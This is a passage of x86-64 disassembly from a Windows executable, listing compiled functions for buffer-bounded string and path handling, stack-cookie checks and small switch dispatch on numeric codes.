   140003d32:	e8 b9 e8 ff ff       	call   0x1400025f0
   140003d37:	e9 83 00 00 00       	jmp    0x140003dbf
   140003d3c:	48 85 db             	test   %rbx,%rbx
   140003d3f:	75 1b                	jne    0x140003d5c
   140003d41:	eb 7c                	jmp    0x140003dbf
   140003d43:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140003d48:	e8 a3 db ff ff       	call   0x1400018f0
   140003d4d:	48 8b d8             	mov    %rax,%rbx
   140003d50:	48 85 c0             	test   %rax,%rax
   140003d53:	74 59                	je     0x140003dae
   140003d55:	48 63 c7             	movslq %edi,%rax
   140003d58:	48 89 1c c6          	mov    %rbx,(%rsi,%rax,8)
   140003d5c:	48 8b d5             	mov    %rbp,%rdx
   140003d5f:	48 8b cb             	mov    %rbx,%rcx
   140003d62:	e8 79 da ff ff       	call   0x1400017e0
   140003d67:	48 85 c0             	test   %rax,%rax
   140003d6a:	75 16                	jne    0x140003d82
   140003d6c:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   140003d71:	48 8b d5             	mov    %rbp,%rdx
   140003d74:	48 8d 0d b5 86 02 00 	lea    0x286b5(%rip),%rcx        # 0x14002c430
   140003d7b:	e8 70 e8 ff ff       	call   0x1400025f0
   140003d80:	eb 4e                	jmp    0x140003dd0
   140003d82:	4d 8b c6             	mov    %r14,%r8
   140003d85:	48 8b d0             	mov    %rax,%rdx
   140003d88:	48 8b cb             	mov    %rbx,%rcx
   140003d8b:	e8 30 d8 ff ff       	call   0x1400015c0
   140003d90:	85 c0                	test   %eax,%eax
   140003d92:	79 16                	jns    0x140003daa
   140003d94:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   140003d99:	48 8b d5             	mov    %rbp,%rdx
   140003d9c:	48 8d 0d cd 86 02 00 	lea    0x286cd(%rip),%rcx        # 0x14002c470
   140003da3:	e8 48 e8 ff ff       	call   0x1400025f0
   140003da8:	eb 26                	jmp    0x140003dd0
   140003daa:	33 c0                	xor    %eax,%eax
   140003dac:	eb 27                	jmp    0x140003dd5
   140003dae:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   140003db3:	48 8d 0d 86 85 02 00 	lea    0x28586(%rip),%rcx        # 0x14002c340
   140003dba:	e8 31 e8 ff ff       	call   0x1400025f0
   140003dbf:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   140003dc4:	48 8d 0d 2d 86 02 00 	lea    0x2862d(%rip),%rcx        # 0x14002c3f8
   140003dcb:	e8 20 e8 ff ff       	call   0x1400025f0
   140003dd0:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140003dd5:	48 8b 8c 24 50 40 00 	mov    0x4050(%rsp),%rcx
   140003ddc:	00 
   140003ddd:	48 33 cc             	xor    %rsp,%rcx
   140003de0:	e8 8b 7a 00 00       	call   0x14000b870
   140003de5:	48 81 c4 60 40 00 00 	add    $0x4060,%rsp
   140003dec:	41 5e                	pop    %r14
   140003dee:	5f                   	pop    %rdi
   140003def:	5e                   	pop    %rsi
   140003df0:	5d                   	pop    %rbp
   140003df1:	5b                   	pop    %rbx
   140003df2:	c3                   	ret
   140003df3:	cc                   	int3
   140003df4:	cc                   	int3
   140003df5:	cc                   	int3
   140003df6:	cc                   	int3
   140003df7:	cc                   	int3
   140003df8:	cc                   	int3
   140003df9:	cc                   	int3
   140003dfa:	cc                   	int3
   140003dfb:	cc                   	int3
   140003dfc:	cc                   	int3
   140003dfd:	cc                   	int3
   140003dfe:	cc                   	int3
   140003dff:	cc                   	int3
   140003e00:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003e05:	57                   	push   %rdi
   140003e06:	48 83 ec 20          	sub    $0x20,%rsp
   140003e0a:	48 8b fa             	mov    %rdx,%rdi
   140003e0d:	4d 8b c8             	mov    %r8,%r9
   140003e10:	4c 8d 05 15 7c 02 00 	lea    0x27c15(%rip),%r8        # 0x14002ba2c
   140003e17:	ba 00 10 00 00       	mov    $0x1000,%edx
   140003e1c:	48 8b d9             	mov    %rcx,%rbx
   140003e1f:	e8 cc dd ff ff       	call   0x140001bf0
   140003e24:	3d 00 10 00 00       	cmp    $0x1000,%eax
   140003e29:	7d 4d                	jge    0x140003e78
   140003e2b:	ba 3a 00 00 00       	mov    $0x3a,%edx
   140003e30:	48 8b cb             	mov    %rbx,%rcx
   140003e33:	e8 f8 88 00 00       	call   0x14000c730
   140003e38:	48 85 c0             	test   %rax,%rax
   140003e3b:	74 3b                	je     0x140003e78
   140003e3d:	c6 00 00             	movb   $0x0,(%rax)
   140003e40:	48 8b d7             	mov    %rdi,%rdx
   140003e43:	48 ff c0             	inc    %rax
   140003e46:	48 2b d0             	sub    %rax,%rdx
   140003e49:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140003e50:	0f b6 08             	movzbl (%rax),%ecx
   140003e53:	88 0c 02             	mov    %cl,(%rdx,%rax,1)
   140003e56:	48 8d 40 01          	lea    0x1(%rax),%rax
   140003e5a:	84 c9                	test   %cl,%cl
   140003e5c:	75 f2                	jne    0x140003e50
   140003e5e:	38 0b                	cmp    %cl,(%rbx)
   140003e60:	74 16                	je     0x140003e78
   140003e62:	0f b6 07             	movzbl (%rdi),%eax
   140003e65:	f6 d8                	neg    %al
   140003e67:	1b c0                	sbb    %eax,%eax
   140003e69:	f7 d8                	neg    %eax
   140003e6b:	ff c8                	dec    %eax
   140003e6d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003e72:	48 83 c4 20          	add    $0x20,%rsp
   140003e76:	5f                   	pop    %rdi
   140003e77:	c3                   	ret
   140003e78:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003e7d:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140003e82:	48 83 c4 20          	add    $0x20,%rsp
   140003e86:	5f                   	pop    %rdi
   140003e87:	c3                   	ret
   140003e88:	cc                   	int3
   140003e89:	cc                   	int3
   140003e8a:	cc                   	int3
   140003e8b:	cc                   	int3
   140003e8c:	cc                   	int3
   140003e8d:	cc                   	int3
   140003e8e:	cc                   	int3
   140003e8f:	cc                   	int3
   140003e90:	40 53                	rex push %rbx
   140003e92:	48 83 ec 20          	sub    $0x20,%rsp
   140003e96:	4c 8b ca             	mov    %rdx,%r9
   140003e99:	4c 8d 05 8c 7b 02 00 	lea    0x27b8c(%rip),%r8        # 0x14002ba2c
   140003ea0:	ba 00 10 00 00       	mov    $0x1000,%edx
   140003ea5:	48 8b d9             	mov    %rcx,%rbx
   140003ea8:	e8 43 dd ff ff       	call   0x140001bf0
   140003ead:	3d 00 10 00 00       	cmp    $0x1000,%eax
   140003eb2:	7c 08                	jl     0x140003ebc
   140003eb4:	32 c0                	xor    %al,%al
   140003eb6:	48 83 c4 20          	add    $0x20,%rsp
   140003eba:	5b                   	pop    %rbx
   140003ebb:	c3                   	ret
   140003ebc:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
   140003ec3:	80 7c 03 01 00       	cmpb   $0x0,0x1(%rbx,%rax,1)
   140003ec8:	48 8d 40 01          	lea    0x1(%rax),%rax
   140003ecc:	75 f5                	jne    0x140003ec3
   140003ece:	80 7c 18 ff 5c       	cmpb   $0x5c,-0x1(%rax,%rbx,1)
   140003ed3:	75 05                	jne    0x140003eda
   140003ed5:	c6 44 18 ff 00       	movb   $0x0,-0x1(%rax,%rbx,1)
   140003eda:	ba 5c 00 00 00       	mov    $0x5c,%edx
   140003edf:	48 8b cb             	mov    %rbx,%rcx
   140003ee2:	e8 c5 88 00 00       	call   0x14000c7ac
   140003ee7:	48 85 c0             	test   %rax,%rax
   140003eea:	74 0b                	je     0x140003ef7
   140003eec:	c6 00 00             	movb   $0x0,(%rax)
   140003eef:	b0 01                	mov    $0x1,%al
   140003ef1:	48 83 c4 20          	add    $0x20,%rsp
   140003ef5:	5b                   	pop    %rbx
   140003ef6:	c3                   	ret
   140003ef7:	66 c7 03 2e 00       	movw   $0x2e,(%rbx)
   140003efc:	b0 01                	mov    $0x1,%al
   140003efe:	48 83 c4 20          	add    $0x20,%rsp
   140003f02:	5b                   	pop    %rbx
   140003f03:	c3                   	ret
   140003f04:	cc                   	int3
   140003f05:	cc                   	int3
   140003f06:	cc                   	int3
   140003f07:	cc                   	int3
   140003f08:	cc                   	int3
   140003f09:	cc                   	int3
   140003f0a:	cc                   	int3
   140003f0b:	cc                   	int3
   140003f0c:	cc                   	int3
   140003f0d:	cc                   	int3
   140003f0e:	cc                   	int3
   140003f0f:	cc                   	int3
   140003f10:	b8 78 20 00 00       	mov    $0x2078,%eax
   140003f15:	e8 56 7c 00 00       	call   0x14000bb70
   140003f1a:	48 2b e0             	sub    %rax,%rsp
   140003f1d:	48 8b 05 1c a1 03 00 	mov    0x3a11c(%rip),%rax        # 0x14003e040
   140003f24:	48 33 c4             	xor    %rsp,%rax
   140003f27:	48 89 84 24 60 20 00 	mov    %rax,0x2060(%rsp)
   140003f2e:	00 
   140003f2f:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   140003f35:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   140003f3a:	e8 71 47 00 00       	call   0x1400086b0
   140003f3f:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140003f44:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140003f49:	e8 d6 10 01 00       	call   0x140015024
   140003f4e:	33 c9                	xor    %ecx,%ecx
   140003f50:	85 c0                	test   %eax,%eax
   140003f52:	0f 94 c1             	sete   %cl
   140003f55:	8b c1                	mov    %ecx,%eax
   140003f57:	48 8b 8c 24 60 20 00 	mov    0x2060(%rsp),%rcx
   140003f5e:	00 
   140003f5f:	48 33 cc             	xor    %rsp,%rcx
   140003f62:	e8 09 79 00 00       	call   0x14000b870
   140003f67:	48 81 c4 78 20 00 00 	add    $0x2078,%rsp
   140003f6e:	c3                   	ret
   140003f6f:	cc                   	int3
   140003f70:	40 53                	rex push %rbx
   140003f72:	b8 50 20 00 00       	mov    $0x2050,%eax
   140003f77:	e8 f4 7b 00 00       	call   0x14000bb70
   140003f7c:	48 2b e0             	sub    %rax,%rsp
   140003f7f:	48 8b 05 ba a0 03 00 	mov    0x3a0ba(%rip),%rax        # 0x14003e040
   140003f86:	48 33 c4             	xor    %rsp,%rax
   140003f89:	48 89 84 24 40 20 00 	mov    %rax,0x2040(%rsp)
   140003f90:	00 
   140003f91:	48 8b da             	mov    %rdx,%rbx
   140003f94:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   140003f9a:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   140003f9f:	e8 0c 47 00 00       	call   0x1400086b0
   140003fa4:	41 b8 0a 00 00 00    	mov    $0xa,%r8d
   140003faa:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140003faf:	48 8b cb             	mov    %rbx,%rcx
   140003fb2:	e8 f9 46 00 00       	call   0x1400086b0
   140003fb7:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140003fbc:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140003fc1:	e8 de 12 01 00       	call   0x1400152a4
   140003fc6:	48 8b 8c 24 40 20 00 	mov    0x2040(%rsp),%rcx
   140003fcd:	00 
   140003fce:	48 33 cc             	xor    %rsp,%rcx
   140003fd1:	e8 9a 78 00 00       	call   0x14000b870
   140003fd6:	48 81 c4 50 20 00 00 	add    $0x2050,%rsp
   140003fdd:	5b                   	pop    %rbx
   140003fde:	c3                   	ret
   140003fdf:	cc                   	int3
   140003fe0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003fe5:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140003fea:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140003fef:	57                   	push   %rdi
   140003ff0:	48 83 ec 20          	sub    $0x20,%rsp
   140003ff4:	49 8b f0             	mov    %r8,%rsi
   140003ff7:	4c 8b ca             	mov    %rdx,%r9
   140003ffa:	bd 00 10 00 00       	mov    $0x1000,%ebp
   140003fff:	4c 8d 05 26 7a 02 00 	lea    0x27a26(%rip),%r8        # 0x14002ba2c
   140004006:	8b d5                	mov    %ebp,%edx
   140004008:	48 8b f9             	mov    %rcx,%rdi
   14000400b:	e8 e0 db ff ff       	call   0x140001bf0
   140004010:	48 63 c8             	movslq %eax,%rcx
   140004013:	48 81 f9 ff 0f 00 00 	cmp    $0xfff,%rcx
   14000401a:	73 66                	jae    0x140004082
   14000401c:	80 7c 39 ff 5c       	cmpb   $0x5c,-0x1(%rcx,%rdi,1)
   140004021:	74 0a                	je     0x14000402d
   140004023:	66 c7 04 39 5c 00    	movw   $0x5c,(%rcx,%rdi,1)
   140004029:	48 83 c1 02          	add    $0x2,%rcx
   14000402d:	48 c7 c3 ff ff ff ff 	mov    $0xffffffffffffffff,%rbx
   140004034:	48 2b e9             	sub    %rcx,%rbp
   140004037:	48 8b c3             	mov    %rbx,%rax
   14000403a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140004040:	48 ff c0             	inc    %rax
   140004043:	80 3c 06 00          	cmpb   $0x0,(%rsi,%rax,1)
   140004047:	75 f7                	jne    0x140004040
   140004049:	48 3b c5             	cmp    %rbp,%rax
   14000404c:	73 34                	jae    0x140004082
   14000404e:	80 7c 30 ff 5c       	cmpb   $0x5c,-0x1(%rax,%rsi,1)
   140004053:	4c 8b c5             	mov    %rbp,%r8
   140004056:	48 8b d6             	mov    %rsi,%rdx
   140004059:	48 8b cf             	mov    %rdi,%rcx
   14000405c:	75 1a                	jne    0x140004078
   14000405e:	e8 dd 0f 01 00       	call   0x140015040
   140004063:	80 7c 1f 01 00       	cmpb   $0x0,0x1(%rdi,%rbx,1)
   140004068:	48 8d 5b 01          	lea    0x1(%rbx),%rbx
   14000406c:	75 f5                	jne    0x140004063
   14000406e:	c6 44 3b ff 00       	movb   $0x0,-0x1(%rbx,%rdi,1)
   140004073:	48 8b c7             	mov    %rdi,%rax
   140004076:	eb 0c                	jmp    0x140004084
   140004078:	e8 c3 0f 01 00       	call   0x140015040
   14000407d:	48 8b c7             	mov    %rdi,%rax
   140004080:	eb 02                	jmp    0x140004084
   140004082:	33 c0                	xor    %eax,%eax
   140004084:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004089:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   14000408e:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140004093:	48 83 c4 20          	add    $0x20,%rsp
   140004097:	5f                   	pop    %rdi
   140004098:	c3                   	ret
   140004099:	cc                   	int3
   14000409a:	cc                   	int3
   14000409b:	cc                   	int3
   14000409c:	cc                   	int3
   14000409d:	cc                   	int3
   14000409e:	cc                   	int3
   14000409f:	cc                   	int3
   1400040a0:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   1400040a5:	57                   	push   %rdi
   1400040a6:	b8 30 40 00 00       	mov    $0x4030,%eax
   1400040ab:	e8 c0 7a 00 00       	call   0x14000bb70
   1400040b0:	48 2b e0             	sub    %rax,%rsp
   1400040b3:	48 8b 05 86 9f 03 00 	mov    0x39f86(%rip),%rax        # 0x14003e040
   1400040ba:	48 33 c4             	xor    %rsp,%rax
   1400040bd:	48 89 84 24 20 40 00 	mov    %rax,0x4020(%rsp)
   1400040c4:	00 
   1400040c5:	48 8b da             	mov    %rdx,%rbx
   1400040c8:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   1400040ce:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400040d3:	48 8b f9             	mov    %rcx,%rdi
   1400040d6:	e8 d5 45 00 00       	call   0x1400086b0
   1400040db:	48 85 c0             	test   %rax,%rax
   1400040de:	74 74                	je     0x140004154
   1400040e0:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   1400040e6:	48 8d 94 24 20 20 00 	lea    0x2020(%rsp),%rdx
   1400040ed:	00 
   1400040ee:	48 8b cb             	mov    %rbx,%rcx
   1400040f1:	e8 ba 45 00 00       	call   0x1400086b0
   1400040f6:	48 85 c0             	test   %rax,%rax
   1400040f9:	74 59                	je     0x140004154
   1400040fb:	45 33 c0             	xor    %r8d,%r8d
   1400040fe:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140004103:	44 39 05 fe 9e 03 00 	cmp    %r8d,0x39efe(%rip)        # 0x14003e008
   14000410a:	48 8d 8c 24 20 20 00 	lea    0x2020(%rsp),%rcx
   140004111:	00 
   140004112:	b8 02 00 00 00       	mov    $0x2,%eax
   140004117:	44 0f 45 c0          	cmovne %eax,%r8d
   14000411b:	ff 15 af 6f 02 00    	call   *0x26faf(%rip)        # 0x14002b0d0
   140004121:	84 c0                	test   %al,%al
   140004123:	75 2b                	jne    0x140004150
   140004125:	83 3d dc 9e 03 00 00 	cmpl   $0x0,0x39edc(%rip)        # 0x14003e008
   14000412c:	74 26                	je     0x140004154
   14000412e:	ff 15 7c 6f 02 00    	call   *0x26f7c(%rip)        # 0x14002b0b0
   140004134:	83 f8 57             	cmp    $0x57,%eax
   140004137:	75 1b                	jne    0x140004154
   140004139:	48 8b d3             	mov    %rbx,%rdx
   14000413c:	c7 05 c2 9e 03 00 00 	movl   $0x0,0x39ec2(%rip)        # 0x14003e008
   140004143:	00 00 00 
   140004146:	48 8b cf             	mov    %rdi,%rcx
   140004149:	e8 52 ff ff ff       	call   0x1400040a0
   14000414e:	eb 09                	jmp    0x140004159
   140004150:	33 c0                	xor    %eax,%eax
   140004152:	eb 05                	jmp    0x140004159
   140004154:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140004159:	48 8b 8c 24 20 40 00 	mov    0x4020(%rsp),%rcx
   140004160:	00 
   140004161:	48 33 cc             	xor    %rsp,%rcx
   140004164:	e8 07 77 00 00       	call   0x14000b870
   140004169:	48 8b 9c 24 50 40 00 	mov    0x4050(%rsp),%rbx
   140004170:	00 
   140004171:	48 81 c4 30 40 00 00 	add    $0x4030,%rsp
   140004178:	5f                   	pop    %rdi
   140004179:	c3                   	ret
   14000417a:	cc                   	int3
   14000417b:	cc                   	int3
   14000417c:	cc                   	int3
   14000417d:	cc                   	int3
   14000417e:	cc                   	int3
   14000417f:	cc                   	int3
   140004180:	40 53                	rex push %rbx
   140004182:	b8 40 20 00 00       	mov    $0x2040,%eax
   140004187:	e8 e4 79 00 00       	call   0x14000bb70
   14000418c:	48 2b e0             	sub    %rax,%rsp
   14000418f:	48 8b 05 aa 9e 03 00 	mov    0x39eaa(%rip),%rax        # 0x14003e040
   140004196:	48 33 c4             	xor    %rsp,%rax
   140004199:	48 89 84 24 30 20 00 	mov    %rax,0x2030(%rsp)
   1400041a0:	00 
   1400041a1:	48 8b da             	mov    %rdx,%rbx
   1400041a4:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   1400041aa:	48 8b d1             	mov    %rcx,%rdx
   1400041ad:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400041b2:	e8 61 1f 01 00       	call   0x140016118
   1400041b7:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400041bc:	e8 bb 2a 01 00       	call   0x140016c7c
   1400041c1:	48 89 03             	mov    %rax,(%rbx)
   1400041c4:	48 f7 d8             	neg    %rax
   1400041c7:	1b c0                	sbb    %eax,%eax
   1400041c9:	f7 d8                	neg    %eax
   1400041cb:	ff c8                	dec    %eax
   1400041cd:	48 8b 8c 24 30 20 00 	mov    0x2030(%rsp),%rcx
   1400041d4:	00 
   1400041d5:	48 33 cc             	xor    %rsp,%rcx
   1400041d8:	e8 93 76 00 00       	call   0x14000b870
   1400041dd:	48 81 c4 40 20 00 00 	add    $0x2040,%rsp
   1400041e4:	5b                   	pop    %rbx
   1400041e5:	c3                   	ret
   1400041e6:	cc                   	int3
   1400041e7:	cc                   	int3
   1400041e8:	cc                   	int3
   1400041e9:	cc                   	int3
   1400041ea:	cc                   	int3
   1400041eb:	cc                   	int3
   1400041ec:	cc                   	int3
   1400041ed:	cc                   	int3
   1400041ee:	cc                   	int3
   1400041ef:	cc                   	int3
   1400041f0:	40 53                	rex push %rbx
   1400041f2:	48 83 ec 50          	sub    $0x50,%rsp
   1400041f6:	4d 8b d1             	mov    %r9,%r10
   1400041f9:	48 8b d9             	mov    %rcx,%rbx
   1400041fc:	81 ea 34 01 00 00    	sub    $0x134,%edx
   140004202:	0f 84 91 00 00 00    	je     0x140004299
   140004208:	83 ea 01             	sub    $0x1,%edx
   14000420b:	0f 84 88 00 00 00    	je     0x140004299
   140004211:	83 ea 01             	sub    $0x1,%edx
   140004214:	74 4c                	je     0x140004262
   140004216:	83 ea 01             	sub    $0x1,%edx
   140004219:	74 10                	je     0x14000422b
   14000421b:	83 fa 01             	cmp    $0x1,%edx
   14000421e:	74 0b                	je     0x14000422b
   140004220:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140004225:	48 83 c4 50          	add    $0x50,%rsp
   140004229:	5b                   	pop    %rbx
   14000422a:	c3                   	ret
   14000422b:	48 8b 05 96 fb 03 00 	mov    0x3fb96(%rip),%rax        # 0x140043dc8
   140004232:	48 8b d3             	mov    %rbx,%rdx
   140004235:	4d 63 c8             	movslq %r8d,%r9
   140004238:	4c 8d 81 38 01 00 00 	lea    0x138(%rcx),%r8
   14000423f:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140004244:	4c 89 54 24 20       	mov    %r10,0x20(%rsp)
   140004249:	ff 15 11 72 02 00    	call   *0x27211(%rip)        # 0x14002b460
   14000424f:	0f 10 00             	movups (%rax),%xmm0
   140004252:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140004256:	c7 83 30 01 00 00 01 	movl   $0x1,0x130(%rbx)
   14000425d:	00 00 00 
   140004260:	eb 6c                	jmp    0x1400042ce
   140004262:	48 8b 05 5f fb 03 00 	mov    0x3fb5f(%rip),%rax        # 0x140043dc8
   140004269:	48 8b d3             	mov    %rbx,%rdx
   14000426c:	4d 63 c8             	movslq %r8d,%r9
   14000426f:	4c 8d 81 20 01 00 00 	lea    0x120(%rcx),%r8
   140004276:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000427b:	4c 89 54 24 20       	mov    %r10,0x20(%rsp)
   140004280:	ff 15 da 71 02 00    	call   *0x271da(%rip)        # 0x14002b460
   140004286:	0f 10 00             	movups (%rax),%xmm0
   140004289:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   14000428d:	c7 83 18 01 00 00 01 	movl   $0x1,0x118(%rbx)
   140004294:	00 00 00 
   140004297:	eb 35                	jmp    0x1400042ce
   140004299:	48 8b 05 28 fb 03 00 	mov    0x3fb28(%rip),%rax        # 0x140043dc8
   1400042a0:	48 8b d3             	mov    %rbx,%rdx
   1400042a3:	4d 63 c8             	movslq %r8d,%r9
   1400042a6:	4c 8d 81 00 01 00 00 	lea    0x100(%rcx),%r8
   1400042ad:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400042b2:	4c 89 54 24 20       	mov    %r10,0x20(%rsp)
   1400042b7:	ff 15 a3 71 02 00    	call   *0x271a3(%rip)        # 0x14002b460
   1400042bd:	0f 10 00             	movups (%rax),%xmm0
   1400042c0:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   1400042c4:	c7 83 f8 00 00 00 01 	movl   $0x1,0xf8(%rbx)
   1400042cb:	00 00 00 
   1400042ce:	48 8b 05 a3 fb 03 00 	mov    0x3fba3(%rip),%rax        # 0x140043e78
   1400042d5:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400042da:	0f 29 44 24 30       	movaps %xmm0,0x30(%rsp)
   1400042df:	0f 29 4c 24 40       	movaps %xmm1,0x40(%rsp)
   1400042e4:	ff 15 76 71 02 00    	call   *0x27176(%rip)        # 0x14002b460
   1400042ea:	f7 d8                	neg    %eax
   1400042ec:	1b c0                	sbb    %eax,%eax
   1400042ee:	48 83 c4 50          	add    $0x50,%rsp
   1400042f2:	5b                   	pop    %rbx
   1400042f3:	c3                   	ret
   1400042f4:	cc                   	int3
   1400042f5:	cc                   	int3
   1400042f6:	cc                   	int3
   1400042f7:	cc                   	int3
   1400042f8:	cc                   	int3
   1400042f9:	cc                   	int3
   1400042fa:	cc                   	int3
   1400042fb:	cc                   	int3
   1400042fc:	cc                   	int3
   1400042fd:	cc                   	int3
   1400042fe:	cc                   	int3
   1400042ff:	cc                   	int3
   140004300:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004305:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000430a:	57                   	push   %rdi
   14000430b:	48 83 ec 70          	sub    $0x70,%rsp
   14000430f:	49 8b c0             	mov    %r8,%rax
   140004312:	48 8b fa             	mov    %rdx,%rdi
   140004315:	48 8b f1             	mov    %rcx,%rsi
   140004318:	45 33 c0             	xor    %r8d,%r8d
   14000431b:	48 8b c8             	mov    %rax,%rcx
   14000431e:	33 d2                	xor    %edx,%edx
   140004320:	e8 8b 43 00 00       	call   0x1400086b0
   140004325:	48 8b d8             	mov    %rax,%rbx
   140004328:	48 85 c0             	test   %rax,%rax
   14000432b:	75 17                	jne    0x140004344
   14000432d:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140004332:	4c 8d 5c 24 70       	lea    0x70(%rsp),%r11
   140004337:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   14000433b:	49 8b 73 18          	mov    0x18(%r11),%rsi
   14000433f:	49 8b e3             	mov    %r11,%rsp
   140004342:	5f                   	pop    %rdi
   140004343:	c3                   	ret
   140004344:	48 8b 05 75 fa 03 00 	mov    0x3fa75(%rip),%rax        # 0x140043dc0
   14000434b:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140004350:	4c 8b cb             	mov    %rbx,%r9
   140004353:	4c 8b c7             	mov    %rdi,%r8
   140004356:	48 8b d6             	mov    %rsi,%rdx
   140004359:	ff 15 01 71 02 00    	call   *0x27101(%rip)        # 0x14002b460
   14000435f:	48 8b cb             	mov    %rbx,%rcx
   140004362:	0f 10 00             	movups (%rax),%xmm0
   140004365:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   14000436a:	0f 10 40 10          	movups 0x10(%rax),%xmm0
   14000436e:	0f 11 44 24 50       	movups %xmm0,0x50(%rsp)
   140004373:	e8 e4 fd 00 00       	call   0x14001415c
   140004378:	0f 10 44 24 30       	movups 0x30(%rsp),%xmm0
   14000437d:	48 8b 05 f4 fa 03 00 	mov    0x3faf4(%rip),%rax        # 0x140043e78
   140004384:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140004389:	0f 10 4c 24 50       	movups 0x50(%rsp),%xmm1
   14000438e:	0f 29 44 24 30       	movaps %xmm0,0x30(%rsp)
   140004393:	0f 29 4c 24 40       	movaps %xmm1,0x40(%rsp)
   140004398:	ff 15 c2 70 02 00    	call   *0x270c2(%rip)        # 0x14002b460
   14000439e:	4c 8d 5c 24 70       	lea    0x70(%rsp),%r11
   1400043a3:	f7 d8                	neg    %eax
   1400043a5:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   1400043a9:	49 8b 73 18          	mov    0x18(%r11),%rsi
   1400043ad:	1b c0                	sbb    %eax,%eax
   1400043af:	49 8b e3             	mov    %r11,%rsp
   1400043b2:	5f                   	pop    %rdi
   1400043b3:	c3                   	ret
   1400043b4:	cc                   	int3
   1400043b5:	cc                   	int3
   1400043b6:	cc                   	int3
   1400043b7:	cc                   	int3
   1400043b8:	cc                   	int3
   1400043b9:	cc                   	int3
   1400043ba:	cc                   	int3
   1400043bb:	cc                   	int3
   1400043bc:	cc                   	int3
   1400043bd:	cc                   	int3
   1400043be:	cc                   	int3
   1400043bf:	cc                   	int3
   1400043c0:	81 e9 34 01 00 00    	sub    $0x134,%ecx
   1400043c6:	74 44                	je     0x14000440c
   1400043c8:	83 e9 01             	sub    $0x1,%ecx
   1400043cb:	74 30                	je     0x1400043fd
   1400043cd:	83 e9 01             	sub    $0x1,%ecx
   1400043d0:	74 1c                	je     0x1400043ee
   1400043d2:	83 e9 01             	sub    $0x1,%ecx
   1400043d5:	74 08                	je     0x1400043df
   1400043d7:	83 f9 01             	cmp    $0x1,%ecx
   1400043da:	74 03                	je     0x1400043df
   1400043dc:	33 c0                	xor    %eax,%eax
   1400043de:	c3                   	ret
   1400043df:	ba b0 01 00 00       	mov    $0x1b0,%edx
   1400043e4:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400043e9:	e9 66 fd 00 00       	jmp    0x140014154
   1400043ee:	ba 90 01 00 00       	mov    $0x190,%edx
   1400043f3:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400043f8:	e9 57 fd 00 00       	jmp    0x140014154
   1400043fd:	ba 88 01 00 00       	mov    $0x188,%edx
   140004402:	b9 01 00 00 00       	mov    $0x1,%ecx
   140004407:	e9 48 fd 00 00       	jmp    0x140014154
   14000440c:	ba 68 01 00 00       	mov    $0x168,%edx
   140004411:	b9 01 00 00 00       	mov    $0x1,%ecx
   140004416:	e9 39 fd 00 00       	jmp    0x140014154
   14000441b:	cc                   	int3
   14000441c:	cc                   	int3
   14000441d:	cc                   	int3
   14000441e:	cc                   	int3
   14000441f:	cc                   	int3
   140004420:	40 53                	rex push %rbx
   140004422:	48 83 ec 20          	sub    $0x20,%rsp
   140004426:	48 8b 05 73 f9 03 00 	mov    0x3f973(%rip),%rax        # 0x140043da0
   14000442d:	48 8b d9             	mov    %rcx,%rbx
   140004430:	ff 15 2a 70 02 00    	call   *0x2702a(%rip)        # 0x14002b460
   140004436:	48 8b cb             	mov    %rbx,%rcx
   140004439:	48 83 c4 20          	add    $0x20,%rsp
   14000443d:	5b                   	pop    %rbx
   14000443e:	e9 19 fd 00 00       	jmp    0x14001415c
   140004443:	cc                   	int3
   140004444:	cc                   	int3
